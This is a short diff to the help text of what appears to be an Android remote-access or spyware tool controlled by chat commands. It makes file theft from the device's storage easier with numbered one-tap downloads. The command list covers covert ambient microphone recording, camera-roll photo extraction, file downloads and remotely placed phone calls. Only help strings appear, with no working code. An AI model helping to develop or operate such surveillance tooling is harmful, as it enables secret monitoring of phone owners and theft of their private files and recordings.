@@ -85,8 +85,8 @@ class HelpCommand @Inject constructor() : Command {
             • <code>/record &lt;seconds&gt;</code> — Ambient microphone recording [PRO TRIAL]
             • <code>/record stop</code> — Stop recording
             • <code>/gallery_latest [count]</code> — Extract recent camera roll photos [NEW]
-            • <code>/getfile &lt;path&gt;</code> — Download file from storage (up to 50MB) [NEW]
-            • <code>/list_files [dir]</code> — Browse device storage directory [NEW]
+            • <code>/getfile &lt;#|name|path&gt;</code> — Download file by number (from /list_files) or path (up to 50MB) [NEW]
+            • <code>/list_files [dir|shortcut] [--all]</code> — Browse storage with 1-tap download numbers [NEW]
 
             📇 <b>Extraction, Telephony &amp; Audit Logs</b>
             • <code>/call &lt;number&gt; [speaker]</code> — Remotely place outbound cellular phone call [NEW]
